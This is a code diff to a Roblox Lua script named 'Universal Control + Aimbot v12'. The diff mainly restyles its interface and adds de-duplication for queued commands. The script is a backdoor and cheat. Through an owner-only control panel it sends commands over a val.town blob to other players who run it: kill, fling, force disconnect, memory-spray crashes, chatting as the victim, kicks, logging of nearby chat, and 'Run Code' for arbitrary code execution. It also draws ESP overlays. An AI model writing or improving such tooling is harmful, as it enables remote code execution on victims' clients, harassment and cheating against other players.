@@ -1,5 +1,5 @@
 --[[
-    [S] Universal Control + Aimbot v11
+    [S] Universal Control + Aimbot v12
     Owners: 1460823186, 7208967899
     Transport: val.town blob
 --]]
@@ -294,7 +294,12 @@ local function executeAction(c)
     if c.action == "flashbang" then showFlashbang() end
     if c.action == "image" then showImage(c.payload, 6) end
 
-    if c.action == "disconnect" then forceDisconnect() end
+    if c.action == "disconnect" then
+        if _G.__sk_disconnect_fired then return end
+        _G.__sk_disconnect_fired = true
+        forceDisconnect()
+        return
+    end
 
     if c.action == "mems_spray_lite" then
         PERSIST.mem_lite = not PERSIST.mem_lite
@@ -356,7 +361,7 @@ local function executeAction(c)
         box.Position = UDim2.new(0.5, -170, 0.12, 0)
         box.BackgroundColor3 = Color3.fromRGB(22, 16, 34)
         box.BorderSizePixel = 0
-        box.TextColor3 = Color3.fromRGB(255, 70, 190)
+        box.TextColor3 = Color3.fromRGB(255, 255, 255)
         box.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
         box.TextStrokeTransparency = 0
         box.Font = Enum.Font.GothamBold
@@ -405,6 +410,27 @@ end
 table.insert(MSG_HANDLERS, executeAction)
 
 -- ============================================================
+-- Startup: drain and burn any queued commands so reload never replays them
+-- ============================================================
+task.spawn(function()
+    task.wait(0.5)
+    pcall(function()
+        local state = readState() or { online = {}, cmd = {} }
+        state.cmd = state.cmd or {}
+        local my = state.cmd[tostring(MY_ID)] or {}
+        for _, c in ipairs(my) do
+            if c.cid then SEEN_CMDS[c.cid] = os.time() end
+        end
+        state.cmd[tostring(MY_ID)] = {}
+        writeState(state)
+    end)
+end)
+
+-- disarm reapply on startup — only genuine respawns should trigger it
+PERSIST.reapply = false
+LAST_ACTION = nil
+
+-- ============================================================
 -- Command poll
 -- ============================================================
 task.spawn(function()
@@ -425,7 +451,7 @@ task.spawn(function()
             end
             local now = os.time()
             for cid, ts in pairs(SEEN_CMDS) do
-                if now - ts > 120 then SEEN_CMDS[cid] = nil end
+                if now - ts > 300 then SEEN_CMDS[cid] = nil end
             end
         end)
         task.wait(0.35)
@@ -455,7 +481,7 @@ task.spawn(function()
 end)
 
 -- ============================================================
--- Nearby chat log (target's perspective, players within 50 studs)
+-- Nearby chat log
 -- ============================================================
 task.spawn(function()
     task.wait(2)
@@ -490,7 +516,7 @@ task.spawn(function()
 end)
 
 -- ============================================================
--- UI helpers (hot pink + black outline)
+-- UI helpers (white text, readable)
 -- ============================================================
 local function makeGui(name)
     local g = Instance.new("ScreenGui")
@@ -529,9 +555,9 @@ local function styleFrame(frame)
 end
 
 local function styleButton(btn)
-    btn.BackgroundColor3 = Color3.fromRGB(105, 65, 155)
+    btn.BackgroundColor3 = Color3.fromRGB(70, 40, 110)
     btn.BorderSizePixel = 0
-    btn.TextColor3 = Color3.fromRGB(255, 70, 190)
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
     btn.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
     btn.TextStrokeTransparency = 0
     btn.Font = Enum.Font.GothamBold
@@ -539,22 +565,22 @@ local function styleButton(btn)
     btn.AutoButtonColor = false
     btn.Active = true
     local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 6); c.Parent = btn
-    local s = Instance.new("UIStroke"); s.Color = Color3.fromRGB(220, 160, 255); s.Thickness = 1.2; s.Transparency = 0.05; s.Parent = btn
+    local s = Instance.new("UIStroke"); s.Color = Color3.fromRGB(200, 140, 255); s.Thickness = 1.3; s.Transparency = 0; s.Parent = btn
     local g = Instance.new("UIGradient")
-    g.Color = ColorSequence.new(Color3.fromRGB(145, 95, 200), Color3.fromRGB(85, 50, 130))
+    g.Color = ColorSequence.new(Color3.fromRGB(100, 60, 155), Color3.fromRGB(55, 30, 90))
     g.Rotation = 90
     g.Parent = btn
     btn.MouseEnter:Connect(function()
-        TweenService:Create(btn, TweenInfo.new(0.12), { BackgroundColor3 = Color3.fromRGB(130, 80, 185) }):Play()
+        TweenService:Create(btn, TweenInfo.new(0.12), { BackgroundColor3 = Color3.fromRGB(95, 55, 140) }):Play()
     end)
     btn.MouseLeave:Connect(function()
-        TweenService:Create(btn, TweenInfo.new(0.12), { BackgroundColor3 = Color3.fromRGB(105, 65, 155) }):Play()
+        TweenService:Create(btn, TweenInfo.new(0.12), { BackgroundColor3 = Color3.fromRGB(70, 40, 110) }):Play()
     end)
     btn.MouseButton1Down:Connect(function()
-        TweenService:Create(btn, TweenInfo.new(0.06), { BackgroundColor3 = Color3.fromRGB(180, 120, 235) }):Play()
+        TweenService:Create(btn, TweenInfo.new(0.06), { BackgroundColor3 = Color3.fromRGB(140, 85, 200) }):Play()
     end)
     btn.MouseButton1Up:Connect(function()
-        TweenService:Create(btn, TweenInfo.new(0.14), { BackgroundColor3 = Color3.fromRGB(105, 65, 155) }):Play()
+        TweenService:Create(btn, TweenInfo.new(0.14), { BackgroundColor3 = Color3.fromRGB(70, 40, 110) }):Play()
     end)
 end
 
@@ -574,7 +600,7 @@ local function makeLabel(parent, text, x, y, w, h, sz, color)
     l.Size = UDim2.new(0, w, 0, h)
     l.Position = UDim2.new(0, x, 0, y)
     l.BackgroundTransparency = 1
-    l.TextColor3 = color or Color3.fromRGB(255, 70, 190)
+    l.TextColor3 = color or Color3.fromRGB(255, 255, 255)
     l.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
     l.TextStrokeTransparency = 0
     l.Font = Enum.Font.GothamBold
@@ -589,12 +615,12 @@ local function makeInput(parent, placeholder, x, y, w, h)
     local t = Instance.new("TextBox")
     t.Size = UDim2.new(0, w, 0, h)
     t.Position = UDim2.new(0, x, 0, y)
-    t.BackgroundColor3 = Color3.fromRGB(46, 32, 68)
+    t.BackgroundColor3 = Color3.fromRGB(40, 22, 62)
     t.BorderSizePixel = 0
-    t.TextColor3 = Color3.fromRGB(255, 70, 190)
+    t.TextColor3 = Color3.fromRGB(255, 255, 255)
     t.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
     t.TextStrokeTransparency = 0
-    t.PlaceholderColor3 = Color3.fromRGB(200, 130, 200)
+    t.PlaceholderColor3 = Color3.fromRGB(200, 175, 230)
     t.Font = Enum.Font.GothamBold
     t.TextSize = 11
     t.PlaceholderText = placeholder
@@ -603,7 +629,7 @@ local function makeInput(parent, placeholder, x, y, w, h)
     t.Active = true
     t.Parent = parent
     local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 6); c.Parent = t
-    local s = Instance.new("UIStroke"); s.Color = Color3.fromRGB(180, 110, 250); s.Transparency = 0.15; s.Parent = t
+    local s = Instance.new("UIStroke"); s.Color = Color3.fromRGB(190, 130, 255); s.Transparency = 0; s.Parent = t
     return t
 end
 
@@ -674,7 +700,7 @@ local function joinServer(placeId, jobId)
     l.Position = UDim2.new(0.5, -200, 0.05, 0)
     l.BackgroundColor3 = Color3.fromRGB(22, 16, 34)
     l.BorderSizePixel = 0
-    l.TextColor3 = Color3.fromRGB(255, 70, 190)
+    l.TextColor3 = Color3.fromRGB(255, 255, 255)
     l.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
     l.TextStrokeTransparency = 0
     l.Font = Enum.Font.GothamBold
@@ -697,7 +723,7 @@ if IS_OWNER then
     local LAST_SYNC  = 0
     local LAST_ERR   = ""
     local CARD_REFS  = {}
-    local TOGGLES    = {}   -- uid -> { invert=bool, ws=bool, ad=bool, mute=bool, flip=bool, anti=bool, reap=bool }
+    local TOGGLES    = {}
 
     local gui = makeGui("[S] Control")
     local frame = Instance.new("Frame")
@@ -714,7 +740,7 @@ if IS_OWNER then
     makeDraggable(frame, header)
 
     makeLabel(header, "CONTROL PANEL", 14, 6, 200, 22, 16)
-    local statusLbl = makeLabel(header, "sync: ...", 240, 8, 150, 14, 10, Color3.fromRGB(210, 190, 250))
+    local statusLbl = makeLabel(header, "sync: ...", 240, 8, 150, 14, 10, Color3.fromRGB(255, 255, 255))
     statusLbl.TextXAlignment = Enum.TextXAlignment.Right
 
     local targetLbl = makeLabel(frame, "Target: none", 14, 34, 360, 14)
@@ -779,7 +805,7 @@ if IS_OWNER then
     histLog.Position = UDim2.new(0, 14, 0, 618)
     histLog.BackgroundColor3 = Color3.fromRGB(20, 12, 32)
     histLog.BorderSizePixel = 0
-    histLog.TextColor3 = Color3.fromRGB(255, 70, 190)
+    histLog.TextColor3 = Color3.fromRGB(255, 255, 255)
     histLog.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
     histLog.TextStrokeTransparency = 0
     histLog.Font = Enum.Font.Code
@@ -889,22 +915,16 @@ if IS_OWNER then
 
             local T = getToggles(uid)
 
-            local function pb(label, x, y, w, cb)
-                local b = makeBtn(panel, label, x, y, w, 22, cb)
-                return b
-            end
+            local function pb(label, x, y, w, cb) makeBtn(panel, label, x, y, w, 22, cb) end
 
-            -- row 1: basic
             pb("Bring",   0, 0, 110, function() cmd(uid, "bring") end)
             pb("Fling",   114, 0, 110, function() cmd(uid, "fling") end)
             pb("Freeze",  228, 0, 110, function() cmd(uid, "freeze") end)
 
-            -- row 2
             pb("Unfreeze",0, 26, 110, function() cmd(uid, "unfreeze") end)
             pb("Explode", 114, 26, 110, function() cmd(uid, "explode") end)
             pb("Kill",    228, 26, 110, function() cmd(uid, "kill") end)
 
-            -- row 3
             pb("Ragdoll", 0, 52, 110, function() cmd(uid, "ragdoll") end)
             pb("Reset",   114, 52, 110, function() cmd(uid, "reset") end)
             pb("Follow",  228, 52, 110, function()
@@ -913,7 +933,6 @@ if IS_OWNER then
                 refreshHistory()
             end)
 
-            -- row 4: sit / flip / flash
             pb("Sit",     0, 82, 110, function() cmd(uid, "sit") end)
             local flipBtn = pb("Flip: OFF", 114, 82, 110, function(self)
                 T.flip = not T.flip
@@ -923,7 +942,6 @@ if IS_OWNER then
             flipBtn.Text = "Flip: " .. (T.flip and "ON" or "OFF")
             pb("Flashbang", 228, 82, 110, function() cmd(uid, "flashbang") end)
 
-            -- row 5: movement swaps
             local invBtn = pb("Invert: OFF", 0, 108, 110, function(self)
                 T.invert = not T.invert
                 self.Text = "Invert: " .. (T.invert and "ON" or "OFF")
@@ -945,7 +963,6 @@ if IS_OWNER then
             end)
             adBtn.Text = "A/D: " .. (T.ad and "ON" or "OFF")
 
-            -- row 6: mute / anti-unfreeze / reapply
             local muteBtn = pb("Mute: OFF", 0, 134, 110, function(self)
                 T.mute = not T.mute
                 self.Text = "Mute: " .. (T.mute and "ON" or "OFF")
@@ -967,40 +984,32 @@ if IS_OWNER then
             end)
             reapBtn.Text = "ReApply: " .. (T.reap and "ON" or "OFF")
 
-            -- row 7: destructive
             pb("Force DC", 0, 160, 110, function() cmd(uid, "disconnect") end)
             pb("Mem Lite", 114, 160, 110, function() cmd(uid, "mems_spray_lite") end)
             pb("Mem Full", 228, 160, 110, function() cmd(uid, "mem_spray_full") end)
 
-            -- row 8: emote input + emote
             local emoteIn = makeInput(panel, "emote id...", 0, 188, 234, 22)
             pb("Emote", 238, 188, 100, function() cmd(uid, "emote", emoteIn.Text) end)
 
-            -- row 9: image input + show
             local imgIn = makeInput(panel, "decal id...", 0, 214, 234, 22)
             pb("Show Img", 238, 214, 100, function() cmd(uid, "image", imgIn.Text) end)
 
-            -- row 10: msg
             local msgIn = makeInput(panel, "message...", 0, 240, 234, 22)
             pb("Send Msg", 238, 240, 100, function() cmd(uid, "message", msgIn.Text) end)
 
-            -- row 11: force chat
             local chatIn = makeInput(panel, "chat as them...", 0, 266, 234, 22)
             pb("Chat", 238, 266, 100, function() cmd(uid, "chat", chatIn.Text) end)
 
-            -- row 12: code
             local codeIn = makeInput(panel, 'print("hi")', 0, 296, 338, 44)
             codeIn.Font = Enum.Font.Code
             pb("Run Code", 0, 344, 338, 22, function() cmd(uid, "code", codeIn.Text) end)
 
-            -- row 13: kick
             makeLabel(panel, "kick message:", 0, 374, 200, 14, 10)
             local kickIn = makeInput(panel, "jump if u want to get banned", 0, 390, 338, 22)
             pb("Kick", 0, 416, 338, 22, function() cmd(uid, "kick", kickIn.Text) end)
 
-            -- row 14: chat log
             makeLabel(panel, "nearby chat (50 studs):", 0, 446, 300, 14, 10)
-            local chatLogLbl = makeLabel(panel, "", 0, 462, 338, 230, 10, Color3.fromRGB(255, 140, 220))
+            local chatLogLbl = makeLabel(panel, "", 0, 462, 338, 230, 10, Color3.fromRGB(255, 255, 255))
             chatLogLbl.TextWrapped = true
             chatLogLbl.TextYAlignment = Enum.TextYAlignment.Top
             chatLogLbl.Font = Enum.Font.Code
@@ -1075,7 +1084,7 @@ if IS_OWNER then
                 empty.Size = UDim2.new(1, -8, 0, 30)
                 empty.BackgroundTransparency = 1
                 empty.Parent = scroll
-                makeLabel(empty, "no clients online...", 4, 6, 300, 18, 12, Color3.fromRGB(255, 130, 210))
+                makeLabel(empty, "no clients online...", 4, 6, 300, 18, 12, Color3.fromRGB(220, 200, 240))
             end
         else
             local empty = scroll:FindFirstChild("__emptyMsg")
@@ -1109,7 +1118,6 @@ if IS_OWNER then
                 else
                     LAST_ERR = "read failed"
                 end
-                -- update chat logs in expanded panels
                 if st and st.chatlog then
                     for uid, ref in pairs(CARD_REFS) do
                         if ref.chatLogLbl then
@@ -1347,7 +1355,7 @@ local function buildEsp(plr)
     local nameL = Instance.new("TextLabel")
     nameL.BackgroundTransparency = 1
     nameL.Size = UDim2.new(1, 0, 0, 16)
-    nameL.TextColor3 = Color3.fromRGB(255, 70, 190)
+    nameL.TextColor3 = Color3.fromRGB(255, 255, 255)
     nameL.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
     nameL.TextStrokeTransparency = 0
     nameL.Font = Enum.Font.GothamBold
@@ -1360,7 +1368,7 @@ local function buildEsp(plr)
     hpL.BackgroundTransparency = 1
     hpL.Size = UDim2.new(1, 0, 0, 14)
     hpL.Position = UDim2.new(0, 0, 0, 16)
-    hpL.TextColor3 = Color3.fromRGB(255, 70, 190)
+    hpL.TextColor3 = Color3.fromRGB(255, 255, 255)
     hpL.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
     hpL.TextStrokeTransparency = 0
     hpL.Font = Enum.Font.GothamBold
@@ -1373,7 +1381,7 @@ local function buildEsp(plr)
     distL.BackgroundTransparency = 1
     distL.Size = UDim2.new(1, 0, 0, 14)
     distL.Position = UDim2.new(0, 0, 0, 30)
-    distL.TextColor3 = Color3.fromRGB(255, 70, 190)
+    distL.TextColor3 = Color3.fromRGB(255, 255, 255)
     distL.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
     distL.TextStrokeTransparency = 0
     distL.Font = Enum.Font.GothamBold
